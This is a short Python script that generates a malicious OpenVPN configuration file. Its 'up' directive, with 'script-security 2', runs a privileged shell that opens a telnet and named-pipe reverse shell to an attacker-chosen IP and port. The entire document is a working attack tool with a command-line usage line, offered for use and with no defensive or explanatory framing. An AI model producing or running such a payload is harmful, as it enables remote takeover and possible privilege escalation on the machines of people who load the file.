import sys
import os

def create(ip: str, port: str, filename: str):
    payload = f"""up '/bin/sh -p -c "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF"'
dev null
script-security 2"""

    try:
        with open(filename + ".ovpn", "w") as file:
            file.write(payload)
        print(f"[+] {filename}.ovpn payload created")
    except Exception as e:
        print(f"Error: {e}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 script.py <ip> <port> <filename>")
        return

    ip = sys.argv[1]
    port = sys.argv[2]
    filename = sys.argv[3]
    create(ip, port, filename)

if __name__ == "__main__":
    main()
